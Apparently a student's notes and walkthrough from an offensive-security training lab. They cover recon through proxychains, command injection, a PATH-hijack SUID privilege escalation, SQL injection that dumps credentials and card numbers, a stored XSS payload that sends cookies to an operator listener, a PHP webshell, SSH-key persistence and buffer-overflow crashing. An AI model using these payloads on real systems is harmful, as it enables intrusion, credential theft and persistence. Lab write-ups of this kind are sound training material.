@@ -1,0 +1,2110 @@
+USE THIS TO GET INFORMATION ON PHP'S AND WHAT OPTIONS THE WEBSITE GIVES TO GET YOU STARTED
+proxychains nmap -Pn -T5 -sT -p 80 --script http-enum.nse <IP>
+proxychains nmap -Pn -T5 -sT -p 80 --script http-robots.txt.nse <IP>
+wget -r http://192.168.
+
+
+SQL INJECTION
+' OR 1='1
+UNION SELECT table_schema,column_name,table_name FROM information_schema.columns #
+
+
+COMMAND INJECTION
+/../../../../../../../../etc/passwd
+/../../../../../../../../etc/hosts
+
+
+; whoami
+; cat /etc/passwd
+; ls -latr & netstat -rn
+|| ifconfig
+
+SSH KEY UPLOAD
+ssh-keygen -t rsa
+cat ~/.ssh/id_rsa.pub
+mkdir /users/home/directory/.ssh
+echo "your_public_key_here" >> /var/www/.ssh/authorized_keys
+cat /users/home/directory/.ssh/authorized_keys
+
+
+
+
+
+HOST DISCOVERY
+for i in {1..254} ;do (ping -c 1 192.168.1.$i | grep "bytes from" &) 2>/dev/null ;done
+
+PORT SCAN
+nmap -sS -Pn 8.8.8.8 -p 135-139,22,80,443,21,8080
+
+
+
+
+
+
+
+
+
+
+PORT INTERROGATION
+nmap -sV 127.0.0.1 -p 22
+
+
+DLL INJECTION (PUTTY)
+Uploaded through scp, ftp, nc, python simple HTTP server, or copying base64 output
+python -m SimpleHTTPServer 8000
+
+base64 bad.dll > base64dll
+
+move base64.txt base64
+
+certutil -decode base64 bad.dll
+
+Put the retrieved DLL in the same location as the vulnerable Putty executable and name it correctly
+copy "PATH OF MALICIOUS DLL"  "c:\users\student\exercise_2\SSPICLI.dll"
+
+
+
+
+
+
+PERSISTANCE LOCATIONS [ COMMAND LINE & GUI ]
+
+REGISTRY KEYS
+reg query and registry editor
+
+Services
+
+REVERSE ENGINEERING
+
+**Open Ghidra, start a new project, and import the binary**
+Once imported, the splash screen for the binary should 
+**include information about its file type, cpu architecture, and several other things.** 
+This should match what you have found so far (x86, 32 bit, portable execuatble )
+
+**Run the code analyzer by clicking on the dragon icon**
+ If your binary does not get loaded into the code analyzer, import it by going to "File"->"Import" or "Open".
+
+**When asked, accept the default options and "analyze" the binary.**
+This automatic analysis finds lots of things that may otherwise not be seen by the disassembler.
+
+
+
+**Once you have found the success message, work upwards.** There will be a **condition** that has be met. 
+This will be a comparison between the return code of the most recent function and some value. 
+**This value will be in hex but can be converted by right-clicking on it** in the disassembly and converting to unsigned int.
+
+
+
+
+
+
+
+
+
+LINUX EXPLOITATION
+
+sudo -l
+
+find / -type f -perm /6000 -ls 2>/dev/null
+-- https://gtfobins.github.io/ 
+
+
+**Take note of the setuid file /bin/netstat_natpu as it stands out to the trained eye as a non-system SUID program.**
+**where an 's' replaces the 'x' in the owner's permission field**
+FOR EXAMPLE -rw*s*r-xr-x 1 root root 845088 Nov  5 17:30 /bin/netstat_natpu
+
+file /bin/netstat_natpu
+
+strings /bin/netstat_natpu | grep -C3 netstat
+
+--
+T$8L
+T$8L
+L;~(
+netstat -antpu
+Not setuid root.
+haswell
+xeon_phi
+--
+
+Highlight to students that the command "netstat -antpu" does not have an absolute path. 
+This means that it uses the PATH environmental variable to search for the executable. 
+An attacker can manipulate the PATH variable and execute any file under her or his control.
+
+printf #!/bin/sh\n/bin/bash -i\n' > netstat # create a script called netstat that executes an interactive shell.
+
+chmod +x netstat
+
+PATH=$(pwd):$PATH /bin/netstat_natpu # GET ROOT
+
+id # did it work?
+    uid=0(root) gid=1002(demo2) groups=1002(demo2)
+
+
+
+
+https://gtfobins.github.io/ 
+
+
+
+WORLD WRITABLE FILES
+find / -type f -perm /2 -o -type d -perm /2 2>/dev/null 
+## Search for any file or directory that is writable by the context "other"
+find / -type f -writable -o -type d -writable 2>/dev/null 
+## Search for any file or directory that is writable by the current user
+
+
+SYSTEM V RUNLEVELS [ SKELETON ]
+
+cp /etc/init.d/skeleton /etc/init.d/<servicename>
+
+or if skeleton file doesn't exist, 
+copy an existing startup script that in the /etc/init.d directory 
+that can be easily modified to the same directory 
+with a new name that blends in and looks like a normal, typical startup script.
+
+cp /etc/init.d/<oldservicename> /etc/init.d/servicename>
+
+chmod +x <servicename>
+
+**Set the script to start when the system enters runlevels 2 through 5.**
+chkconfig --add <servicename>
+
+**create a symbolic link to the appropriate directory. Assuming the default runlevel is 3, 
+and the rc directory for runlevel 3 is /etc/rc3.d/ then run the command:**
+cd /etc/rc3.d && ln -s ../init.d/servicename>
+
+**Verify the creation of the service with:**
+
+chkconfig --list | grep <servicename>
+
+
+
+SystemD
+**SystemD does more than just start services, however for this discussion we will only cover using it to start a script.**
+**Systemd service scripts are stored in the directory: **
+
+/lib/systemd/system.
+
+**To create your own systemd service, copy any service file and edit it for your needs: **
+
+cp /lib/systemd/system/cron.service /lib/systemd/system/<servicename>.service
+
+**Enable the newly created servce to start at boot with the command:**
+
+systemctl enable <servicename>.service
+
+**And start the newly created servce to start at boot with the command:**
+
+systemctl start <servicename>.service
+
+
+
+LINUX LOGGING REWRITE TABLES [ Linux logging SystemV ]
+
+
+HKLM\Software\Microsoft\Windows\CurrentVersion\Run
+HKCU\Software\Microsoft\Windows\CurrentVersion\Run
+HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce
+HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
+
+----------------------------------------
+DEMO: Finding Vulnerable Services
+
+wmic service list full
+sc query
+
+
+
+---------------------------------------
+
+
+
+
+DEMO: Audit Logging
+Show all audit category settings
+
+auditpol /get /category:*
+auditpol /get /category:* | findstr /i "success failure"
+
+4624/4625 = Successful/failed login
+
+4720 = Account created
+
+4672 = Administrative user logged on
+
+7045 = Service created
+
+-------------------------------------
+
+DEMO: Event Logging
+
+Storage: c:\windows\system32\config\
+
+File-Type: .evtx/.evt
+
+
+wevtutil el
+wmic ntevent where "logfile="<LOGNAME>" list full
+Get-Eventlog -List
+
+
+
+
+----------------------
+
+
+
+
+DEMO: Finding vulnerable Scheduled Tasks
+
+schtasks /query /fo LIST /v
+
+
+DEMO: Checking UAC Settings
+
+reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System
+---------------------------------------------------------
+
+FILE TRANSFERS [ NETWORKING MIRO WHITEBOARD, COPY INTO HERE ]
+
+SCP SYNTAX
+NCAT TRANSFER SYNTAX
+BASE64 TRANSFER SYNTAX
+
+
+
+
+--------------------------------------------------------------------------------------------------------------------------------------------
+--------------------------------------------------------------------------------------------------------------------------------------------
+--------------------------------------------------------------------------------------------------------------------------------------------
+--------------------------------------------------------------------------------------------------------------------------------------------
+--------------------------------------------------------------------------------------------------------------------------------------------
+--------------------------------------------------------------------------------------------------------------------------------------------
+--------------------------------------------------------------------------------------------------------------------------------------------
+--------------------------------------------------------------------------------------------------------------------------------------------
+--------------------------------------------------------------------------------------------------------------------------------------------
+
+
+
+
+
+
+details>
+  <summary><h1>Reconnaissance</h1></summary>
+
+# master socket creation
+```
+ssh -MS /tmp/jump student@<ip>
+```
+# proxychains to jump
+```
+ssh -S /tmp/jump -O forward -D 9050 a@1
+```
+# network enumeration
+```
+ip addr	<-- 10.10.28.40/27
+```
+```
+ip neigh | grep -vi failed	--> 10.10.28.33
+```
+```	
+nmap -Pn -T5 -sT 10.10.28.33	\\Didn't work
+```
+# ping sweep for 192.168.28.96/27
+jump: 
+```
+for i in {97..126}; do (ping -c 1 192.168.28.$i | grep "bytes from" &); done
+```
+Results:
+```
+	192.168.28.97 \\broken IP
+	192.168.28.100
+	192.168.28.105
+	192.168.28.111
+	192.168.28.120
+```
+# ping sweep (192.168.150.224/27)
+jump: 
+```
+for i in {225..254}; do (ping -c 1 192.168.150.$i | grep "bytes from" &); done
+```
+# scanning all ports in known hosts
+```
+proxychains nmap -p- -sT -T5 -Pn 192.168.28.100,105,111,120
+ ```
+Results:
+```
+192.168.28.97 \\Broken IP
+	\\ALL CLOSED
+
+192.168.28.100
+	PORT   STATE  SERVICE
+	80/tcp open   http
+  2222/tcp open EtherNetIP-1
+  
+192.168.28.105
+	PORT   STATE  SERVICE
+	21/tcp open   ftp
+	23/tcp open   telnet
+ 2222/tcp open EtherNetIP-1
+ 
+192.168.28.111
+	PORT   STATE  SERVICE
+	80/tcp open   http
+  2222/tcp open EtherNetIP-1
+  8080/tcp open http-proxy
+  
+192.168.28.120
+  4242/tcp open vrml-multi-use
+```
+# collect open HTTP info (.100,.111)
+```
+wget -r http://192.168.28.100
+	\\"Welcome to the Donovian Government website... Under contruction"
+```
+```
+wget -r http://192.168.28.111
+	\\Has authors -> Articles | Names + Email + Org -> Contacts
+```
+# creating port forward		\\connected and found out it had a ftp server open
+```
+ssh -S /tmp/jump -O forward 
+    -L 21100:192.168.28.105:23 a@1
+```   
+# FTP scan on 192.168.28.105
+flag: `heILlxykr0WoooYZAKWH`
+</details>
+<details>
+  <summary><h1>Web Exploitation</h1></summary>
+
+# Enumeration of 10.100.28.40 (T1)
+1.a) Created "Master Socket" to 10.100.28.40
+```
+ssh -MS /tmp/jump student@<JUMP>
+```
+2.) Created Proxychains thru T1
+```
+ssh -S /tmp/jump -O forward -D 9050 a@1
+```
+3.) Scanned T1's ports
+```
+proxychains nmap -p- -sT -T5 -Pn 10.100.28.40
+```
+      PORT     STATE SERVICE
+      80/tcp   open  http
+      4444/tcp open  krb524
+
+4.) Verified Ports:
+```
+proxychains nmap -p80,4444 -sT -T5 -sV 10.100.28.40
+```
+      PORT     STATE SERVICE VERSION
+      80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
+      4444/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+
+5.) Enumerate HTTP w/ "wget"
+``` 
+ proxychains wget -r http://10.100.28.40
+```
+    /:
+    *css* *images*  index.html  robots.txt
+    
+    /css:
+    jquery-ui.min.css  jquery-ui.theme.min.css
+    
+    /images:
+    min_crest.jpeg
+
+6.) Retrieved directories through "--script http-enum"
+```
+proxychains nmap --script http-enum 10.100.28.40
+```
+      PORT     STATE SERVICE
+      80/tcp   open  http
+      | http-enum: 
+      |   /robots.txt: Robots file
+      |   /css/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'
+      |   /images/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'
+      |_  /uploads/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)
+
+7.) `cat robots.txt`
+Results:
+```
+Disallow: /net_test
+```
+8.) Created tunnel to HTTP port
+```
+ssh -S /tmp/jump -O forward -L 21120:10.100.28.40:80 a@1
+```
+
+9.) On Firefox, utilized webesite through "127.0.0.1:21120" enumerated `/net_test`
+  - Discovered `industry_check.php`
+    - Took me to a `/net_test/industry_check.php`
+      - Found a "troubleticket" link -> `/TT/ticket.php`
+          - Is a message board with a HTML address: `Contract_bids.html`
+          - Plugged `Contract_bids.html` to URL: `127.0.0.1:21120/Contract_bids.html`
+          - Found email in text: ***N.Romanoff@MI.ru***
+       
+## Enumerated `/uploads`
+  - In URL: `127.0.0.1:21120/uploads`
+  - Discovered new directory: `message`
+    - Inside `message`:
+      - "Just completed my Cyber Awareness training and it says ATOPIA. Last I checked that is a whole other country.
+        Please send me a corrected cert with the right now.
+        I took my online training from the following website: 10.100.28.55":
+
+## Command Injection 1
+  - when to "/net/test" to find ping page. Three boxes were shown. Tested them all:
+    - "; cat /etc/passwd" - worked in "Path to test" box
+      - billybob:x:1001:1001:you found me FEIJEpEy2h3dsehU5UUW:/home/billybob:/bin/bash
+
+## Command Injection 2
+  - in "127.0.0.1:21120/net_test", utilized Command Injections and navigated the /home directory
+  - found "/home/romanoff@mi.ru/contracts" by uzing, `; ls`
+      - `cat /home/romanoff@mi.ru/contacts`
+          - flag: `T2AMK3sD7WzxbqAF4VZ8`
+   
+## Stored Cross Site Scripting (XSS)
+  - Create simple server (listener on my device):
+    - python3 -m http.server 4321
+  - Go to Trouble Ticketing site that regularly checks system. Grab cookie from there
+    - Add script in comment box: "<script>document.location="http://OP-Station-IP:OPS-PORT/?username=" + document.cookie;</script>"
+        - <script>document.location="http://10.50.155.159:4321/?username=" + document.cookie;</script>
+    - Cookie is grabbed: 10.50.13.205 - - [19/Nov/2025 21:02:03] "GET /?username=COOKIE=OK5CiCz12jfx4TSkppU2;%20PHPSESSID=cl3844p0m5l0h1ffvfp42anorn HTTP/1.1" 200 -
+        - Flag: `OK5CiCz12jfx4TSkppU2`
+
+## Malicious Upload 
+  2.) Navigated to `127.0.0.1:21120/Contract_bids.html`
+  3.) Created script `webshell.py`: 
+  ***
+          <HTML><BODY>
+          <FORM METHOD="GET" NAME="myform" ACTION="">
+          <INPUT TYPE="text" NAME="cmd">
+          <INPUT TYPE="submit" VALUE="Send">
+          </FORM>
+          <pre>
+          <?php
+          if($_GET['cmd']) {
+            system($_GET['cmd']);
+            }
+          ?>
+          </pre>
+          </BODY></HTML>
+***
+  4.) Uploaded `webshell.py` onto website. 
+    - *Note: Tested upload to see normal function before uploading script*
+    
+  5.) Performed *Directory Traversal* by going to "127.0.0.l:21120/net_test"
+  ```
+  ; ls /var/www/html/uploads
+  ; python3 /var/www/html/uploads/webshell.py
+      - This opened up a shell as "billybob"
+  ```
+  6.) Generated ssh-key on my machine
+    - lin-ops: `ssh-keygen -t rsa -b 4096`
+      - Saved in: `/home/student/.ssh/id_rsa.pub`
+      
+  7.) Made directory and stored ssh-key on server using Command Injection
+```
+; mkdir /home/billybob/.ssh
+; ls -latr /home/billybob/   \\Verified ".ssh" was made
+; echo "<rsa.pub_key>" > /home/billybob/.ssh/authorized_keys
+; ls -latr /home/billybob/.ssh    \\Verified "authorized_keys" was made
+```
+  8.) Create SSH Tunnel on my machine to it
+    - ssh -S /tmp/jump -O forward -L 21121:10.100.28.40:4444
+    
+  9.) Attempt to login through tunnel and ssh-key
+    - ssh -v -p21121 billybob@127.0.0.1    \\"v" makes it verbose to see what happens
+    *Note: If prompted for password, something went wrong!*
+    
+  10.) Banner: You are accessing a system operated by the lLYIOZAUi72usDBt0a7e, all actions are being monitored.
+</details>
+
+<details>
+  <summary><h1>SQL Injection</h1></summary>
+
+<details>
+  <summary><h4>DNLA Category</h4></summary>
+
+Enumerated Target: 10.100.28.48
+Before gathering info, make sure to create a proxychains tunnel to your jump box.
+```
+ssh -MS /tmp/jump student@<JUMP> // Pass: BznOvkLSfBHB
+ssh -S /tmp/jump -O forward -D 9050 a@1
+```
+After that, we are good to scan this network and find any open ports!
+```
+proxychains nmap -p- -T5 -Pn -sT 10.100.28.48
+```
+Results:
+```
+PORT     STATE SERVICE
+80/tcp   open  http
+4444/tcp open  krb524
+```
+Lets scan that 4444/tcp port...
+```
+proxychains nmap -p4444 -sV -T5 -Pn -sT 10.100.28.48
+```
+You guessed it, it's an SSH port!
+```
+PORT     STATE SERVICE VERSION
+4444/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+```
+With all the ports identified, lets create a tunnel to their HTTP port!
+```
+ssh -S /tmp/jump -O forward -L 21100:10.100.28.48:80 a@1  <-- Don't forget that!
+```
+Now connect to it via the URL: ***127.0.0.1:21100***
+
+We've connected to "Donovia National Logistics Agency" homepage. The question mentions it's found in the "Categories" page. Let's investigate that.
+
+After poking around, we see that this is a page where it shows SQL Errors and what the query executed. There's also a "Search" category near the header of the page. 
+
+Clicking "Search", a box shows up. After testing it out and seeing what the query executed, at the end of the statement, it adds '%%'. Meaning whatever goes inbetween the "%", it will search for 1 or more characters next to it.
+
+Let's search: ***flag***
+
+Voila! 
+```
+Name	          Description
+VC-096-ULTIMATE	flag: { OKLOiye5Vm3D6ydzqH43 }
+```
+
+</details>
+
+<details>
+  <summary><h4>Tables</h4></summary>
+
+***
+Question: How many user created tables are able to be identified through Injection of the web database?
+***
+First, let's go to the "Search" page where we can execute SQL injections.
+
+Test out the page and check out the "Category 1". Observe what it does to the URL.
+
+We have something called a "Golden Statement" in our notes:
+```
+UNION SELECT table_schema,table_name,column_name FROM information_schema.columns
+```
+Use this just after the URL statement:
+```
+http://127.0.0.1:21100/cases/productsCategory.php?category=1 UNION SELECT table_schema,table_name,column_name FROM information_schema.columns
+```
+Now we get a lot more information with those "schema's"!
+
+Check out the bottom of the list!
+```
+sqlinjection	categories	id
+sqlinjection	categories	name
+sqlinjection	categories	description
+sqlinjection	members	id
+sqlinjection	members	username
+sqlinjection	members	password
+sqlinjection	members	first_name
+sqlinjection	members	last_name
+sqlinjection	members	email
+sqlinjection	members	permission
+sqlinjection	orderlines	id
+sqlinjection	orderlines	quantity
+sqlinjection	orderlines	product
+sqlinjection	orderlines	order
+sqlinjection	orders	id
+sqlinjection	orders	date
+sqlinjection	orders	member
+sqlinjection	payments	id
+sqlinjection	payments	creditcard_number
+sqlinjection	payments	date
+sqlinjection	payments	order
+sqlinjection	permissions	id
+sqlinjection	permissions	level
+sqlinjection	permissions	name
+sqlinjection	permissions	description
+sqlinjection	products	id
+sqlinjection	products	name
+sqlinjection	products	description
+sqlinjection	products	price
+sqlinjection	products	qty_left
+sqlinjection	products	category
+sqlinjection	share4	id
+sqlinjection	share4	comment
+sqlinjection	share4	mime
+sqlinjection	share4	data
+```
+The answer is: ***8***
+
+</details>
+
+<details>
+  <summary><h4>Admin Credentials</h4></summary>
+
+Go to the Page Source to see how "Category 1" interacts.
+```
+SELECT name, description, price FROM products WHERE category=1
+```
+We can possibly exploit this by just replacing "category=1". Let's add this:
+```
+UNION SELECT id,username,password FROM members //Make sure to match the SELECT quantity of members
+```
+*NOTE: I was about to go through all of the columns one section at a time*
+
+Low and behold: 
+```
+Name | Description  | Price
+1    | Boss         | QYtqyMlQ7wT3tXYQz5qB
+```
+</details>
+
+<details>
+<summary><h4>Products</h4></summary>
+
+Since we identified earlyier that the "Search" page automatically places whatever the input you place in between this: ***'%<sldakfjlsd%'***
+
+Let's open all of it up by just placing this: ***%***
+
+The same flag is found:
+```
+VC-096-ULTIMATE	flag: { OKLOiye5Vm3D6ydzqH43 }
+```
+</details>
+
+<details>
+  <summary><h4>Versions</h4></summary>
+
+In the FG, there is a hint if you "CTRL + F" for: "Version"
+```
+Audi' UNION SELECT @@version,database(),3,name,size FROM session.Tires; #
+```
+The part we want to pay attention to is the ***@@version***.
+***
+Let's use it in the URL for a GET response:
+```
+.../productsCategory.php?category=1 UNION SELECT @@version,2,3
+```
+Check what get's spit out:
+```
+10.1.48-MariaDB-0ubuntu0.18.04.1   | 2  | 3
+```
+</details>
+
+<details>
+  <summary><h4>Credit Card</h4></summary>
+
+After collecting all of the tables from an earlier challenge let's look and see if there is anything relevant to credit cards.
+
+We have spotted a clue!
+```
+sqlinjection	payments	id
+sqlinjection	payments	creditcard_number
+sqlinjection	payments	date
+sqlinjection	payments	order
+```
+Let's plug some of these members into the URL:
+```
+.../productsCategory.php?category=1 UNION SELECT id,creditcard_number,date FROM payments
+```
+If we look closely, the flag is spotted in our list:
+```
+11	>>>> iwP4F6xuXzby7Kk9Af0l <<<<	2011-04-01 00:00:00
+```
+</details>
+
+<details>
+  <summary><h4>ID Search</h4></summary>
+
+The question gives us a hint that our flag can be found on ID **1337**. 
+With that being said, we should try out all of our found user created tables and see if any of them give us a result.
+```
+....category=1 UNION SELECT 1,2,3 FROM <try_them_all> WHERE id = 1337
+```
+Eventually, you will get this result from trying "share4":
+```
+1  | 2  | 3.00
+```
+This means it returned something that this ID belonged too. Lets change some of the members out with it's table which is:
+```
+sqlinjection	share4	id
+sqlinjection	share4	comment
+sqlinjection	share4	mime
+sqlinjection	share4	data
+```
+Now, lets plug them in.
+```
+UNION SELECT id,comment,mime FROM share4 WHERE id = 1337
+  *NOTE: This doesn't work due to the field only recognizing "strings" vs "intergers"*
+UNION SELECT comment,mime,data FROM share4
+```
+Results:
+```
+You need to extract file from @@database. |	compressed/zip  |	PK�l�N&O�x�flag.txtUT ���\���\ux�X�;�X�;m���0D�| 5���.�PҨ-� 7RELP�^P/N���lތ�m�p��X���mR�H�1���!N�*V����Ru#=�w��Z@���d٭�f��T�@�_m����Mh�P�EJ�>��Q��t�˝_��<.����RD���Jf4J�I�lc� .0�O-}"(�ه!�z#��R��PK�l�N&O�x���flag.txtUT���\ux�X�;�X�;PKN
+Keys to the Kingdom	                      |  base64	        |  ZmNORndhOHBwVUNyc1hVa1hWbmoK
+```
+  </details>
+  <details>
+    <summary><h4>Create an Admin User</h4></summary>
+
+***
+Using the */cases/register.php* page on DNLA create a user with admin permissions, ensuring the firstname is set to **Hacker**. Once created log in to get the flag.
+***
+First, let's go into the *Register* tab and look at the options we have.
+```
+First name:
+Last name:
+* Username:
+* Password:
+* Email:
+```
+These are our fields we've got to work with. Let's first add Hacker to the "First name" and then single-quotes `'` to all of the other fields and see what that returns us! This gets us a baseline of how it operates.
+```
+INSERT INTO members (first_name, last_name, username, password, email, permission) VALUES ('Hacker', '''', ''', '''', '''', 3)
+```
+Looks like the *third* field only has one set of single quotes. 
+
+Also, it seems the last field is our permissions field. We can confirm that by going to the **Categories** tab and checking it by using a SQL injection in the URL.
+```
+http://127.0.0.1:21140/cases/productsCategory.php?category=1 UNION SELECT first_name,username,permission FROM members
+```
+
+Let's look at the thrid field again. It wasn't properly sanitized! Let's exploit that field and see if we can add the rest of our field names and ignore the rest using a hashtag `#`.
+```
+First name: Hacker
+Last name: Sonic
+* Username: Shadow','Pass','sonic@usmc.mil',1 )#
+* Password: pass
+* Email: hello@world.com
+```
+Let's look at the members table to see if we got our *Permissions* is set at "1"
+
+It is! Now, let's go into the **Login** tab and sign in with our new account.
+```
+Username: Shadow
+Password: Pass
+```
+There, you will find your flag.
+	</details>
+</details>
+
+<details>
+  <summary><h1>Reverse Engineering</h1></summary>
+
+  <details>
+    <summary><h2>Binary Analysis</h2></summary>
+
+	
+  <summary><h1>Introduction</h4></summary>
+  
+Let's start by first connecting to our jump box to look at 192.168.28.111 and enumerate it's ports.
+```
+ssh -MS /tmp/jump student@<JUMP>
+ssh -S /tmp/jump -O forward -D 9050 a@1
+proxychains nmap -p- -sT -Pn -T5 192.168.28.111
+```
+These are the results:
+```
+Nmap scan report for 192.168.28.111
+Host is up (0.0016s latency).
+Not shown: 65532 closed ports
+PORT     STATE  SERVICE
+80/tcp   open   http
+2222/tcp open   EtherNetIP-1
+8080/tcp open   http-proxy
+```
+Now let's verify their versions and see what services they actually provide.
+```
+proxychains nmap -p80,2222,8080 -Pn -T5 -sT -sV 192.168.28.111
+```
+Results:
+```
+PORT     STATE SERVICE VERSION
+80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
+2222/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+8080/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+```
+Let's make a tunnel to both http ports in one line:
+```
+ssh -S /tmp/jump -O forward -L 21120:192.168.28.111:80 -L 22121:192.168.28.111:8080 -L 21110:192.168.28.111:2222 a@1
+```
+Now that we have a connection, let's connect to their terminal with the provided credentials: User: **comrade** Password: **StudentWebExploitPassword**
+```
+ssh -p21110 comrade@127.0.0.1
+```
+Extract the file and also send it to our Windows machine:
+```
+scp -P21110 comrade@127.0.0.1:/var/www/html/consulting/public_html/longTermStorage/entry.exe /home/student
+scp /home/student/entry.exe student@10.50.182.219:/users/student
+```
+</details>
+
+<details>
+  <summary><h4>Entry.exe</h4></summary>
+  
+Now that we have the "entry.exe" on both our Lin_ops and Win_ops boxes, let's run the executable in our Win_ops machine.
+```
+  C:\Users\student> entry.exe
+```
+Results:
+```
+Enter key:
+```
+When you enter something random like "lol" or "123", it returns:
+```
+Invlaid key.
+```
+Time to view the script with Ghidra.
+
+Executable MD5 for entry.exe: **07a199aa4eae4ec4e9fe6f1c60d6f159**
+
+Since we now what is outputted when we first execute "entry.exe". Let's search for it in Ghidra:
+```
+Use the search bar on the top.
+Search -> Program Text -> (Type inquiry) "Search for: Enter key:" -> Click "Search All"
+Go down and search for what creates a successful entry.
+```
+Right above the "Success!", we find the key: ***123@magicKey***
+</details>
+<details>
+<summary><h4>Basic Algorithm</h4></summary>
+
+Starting this off, lets copy over *basic1.exe* over to our Lin_ops and Win_ops.
+```
+scp -P21110 student@192.168.28.111:/var/www/html/consulting/public_html/longTermStorage/basic1.exe /home/student
+```
+Go into the command prompt in our Win_ops to execute the command.
+***
+Note: Only executes in Windows due to the file being an ***PE*** file.
+***
+```
+C:\Users\student> basic1.exe
+```
+Results:
+```
+Enter key:
+```
+Entering something random will show:
+```
+Invalid key.
+```
+After observing normal behavior, let's go into Ghidra and analyze it. 
+
+
+2 * 46 = 92
+3 * 46 = 138
+4 * 46 = 184
+5 * 46 = 230
+6 * 46 = 276
+7 * 46 = 322
+8 * 46 = 368
+9 * 46 = 414
+10 * 46 = 460
+11 * 46 = 506
+2990
+</details>
+  </details>
+</details>
+
+<details>
+  <summary><h1>Exploit Development</h1></summary>
+
+<details>
+  <summary><h4>Intro</h4></summary>
+
+Type of Operation: DEVOPS
+
+Objective:Gorgas Cyber Forces have been able to retrieve copies of the files for your analysis, and stored them under /longTermStorage; however, you will be required to perform your exploits on the target systems. Maneuver through Donovian network, and successfully develop exploit to gain host access.
+
+Tools/Techniques: Exploit binaries on target systems using the tools below.
+
+    Python
+    OllyDBG or an equivelent graphical program
+        http://www.ollydbg.de/
+    GNU Debugger's(GDB) Python Exploit Development Assistance Module
+        https://github.com/longld/peda
+    MetaSploit
+        https://github.com/rapid7/metasploit-framework/wiki/Nightly-Installers
+
+Prior Approvals: Gorgas Cyber Forces have been able to retrieve copies of the files for your analysis; however, you will be required to perform your exploits on the target systems. Exploit Donovian-Webserver, Donovian-Terminal, and Donovian-Manager hosts.
+
+Scheme of Maneuver:
+```
+>Jump Box
+->T1: 192.168.28.111
+->T2: 192.168.28.105
+```
+```
+>Jump Box
+->donovian_grey_host
+-->T3: 192.168.150.245
+```
+## Target Section:
+*T1*
+```
+Hostname: Donovian_Webserver
+IP: 192.168.28.111
+OS: CentOS
+Creds: comrade :: StudentWebExploitPassword
+Last Known SSH Port: 2222
+Action: Exploit binary.
+```
+
+*T2*
+```
+Hostname: Donovian-Terminal
+IP: 192.168.28.105
+OS: unknown
+Creds: comrade :: StudentReconPassword
+Last Known SSH Port: 2222
+```
+
+*T3*
+```
+Hostname: unknown
+IP: 192.168.150.245
+OS: unknown
+Creds:unknown
+Last Known SSH Port: unknown
+PSP: Unknown
+Malware: Unknown
+Action: Exploit a network service on the machine
+```
+</details>
+<details>
+  <summary><h4>Exploit Development</h4></summary>
+
+  <details> 
+  <summary><h4>ELF Exploitation 1</h4></summary>
+
+***
+Situation: Other teams have extracted the inventory.exe networked binary from a Donovian development network. It is believed to closely related to software running in both the Donovian and Gorgan internal networks. Discover vulnerabilities and create a reliable exploit to gain remote access. This will enable exploitation against Donovian targets and provide the basis for developing mitigations on friendly Gorgan networks. You will be required to exfil a copy from the target to your Op Station.
+
+Provided: Executable Package: inventory.exe
+Task: Perform a local buffer overflow on the vulnerable Linux executable, in order to gain access to the desired intel.
+Method: Utilize RE toolset and python to launch and develop exploit.
+
+ASLR is disabled on the target machine.
+
+Exploit this binary found on 192.168.28.111 at /.hidden/inventory.exe to escalate privileges from your pivot user to root.
+
+Enter the contents of /.secret/.verysecret.pdb as the flag
+
+Your flag will be a unique string of twenty random characters.
+***HINT***:  
+```
+What protections are compiled into the binary?
+
+Useful GDB commands:
+info registers
+info proc map
+find
+run
+break *0x00000000
+continue
+
+These are not all required commands, nor are you required to use GDB.
+```
+***
+## PREFACE:
+Before start, let's note that we had a huge mistake. We were supposed to use the executable on `192.168.28.111` machine. For some reason, the only purpose to download `inventory.exe` on our machine was to figure out the offset and where to upload our payload in the script. We will follow this but will make the **CORRECTION** later. For the most part, these initial steps still get us in the right direction.
+***
+Let's first download `inventory.exe` and start using `gdb` to view it.
+
+Next, let's make it executable so that we can *run* it in `gdb`.
+```
+chmod +x /home/student/Downloads/inventory.exe
+```
+After that, let's start utilizing `gdb`.
+```
+gdb ./inventory.exe
+```
+While in `gdb` here are some commands that will be helpful later:
+  - info registers
+  - info proc map
+  - find
+  - run
+  - break *0x00000000
+  - continue
+  - disass
+  - pdisass <--shows possible vulnerable functions
+
+## In `gdb`:
+We want to look at the *main* functions that `inventory.exe` is doing. Do this by utilizing this command:
+```
+disass main
+```
+Results:
+
+<img width="582" height="370" alt="{DA04DB1E-5F98-45F3-BC70-DF380BFEA744}" src="https://github.com/user-attachments/assets/b08482b4-8737-404c-be52-c49749d2d716" />
+
+Let's observe the *call* assembly instructions and go into that function. Our interesting one looks like <getTheGoods>. Let's go into that using `pdisass`:
+```
+pdisass getTheGoods <--- It is CASE-SENSITIVE
+```
+Results:
+
+<img width="583" height="651" alt="{C068A4A5-1417-48B2-AC2B-83C6A74281B0}" src="https://github.com/user-attachments/assets/14b37f66-af91-4829-b7dc-2b4e46f35c80" />
+
+We see there are two functions that are **RED**: *printf@plt* & *fgets@plt*.
+
+Now that we see a potential vulnerability, let's CRASH the program by going past the amount of alloted space it gives for this program. Use `run`. Result:
+```
+Press enter to view inventory:
+```
+This is where we add our random character to crash it. In this case, we will be using '**A**' until it crashes. What we are going to look for is the `EIP` value being overwritten by our '**A**'. 
+```
+[----------------------------------registers-----------------------------------]
+EAX: 0x0 
+EBX: 0x41414141 ('AAAA')
+ECX: 0x0 
+EDX: 0x0 
+ESI: 0xf7fb6000 --> 0x1d4d8c 
+EDI: 0x0 
+EBP: 0x41414141 ('AAAA')
+ESP: 0xffffd230 ('A' <repeats 92 times>, "\n")
+EIP: 0x41414141 ('AAAA')    <------ Looks like it worked!
+EFLAGS: 0x10282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
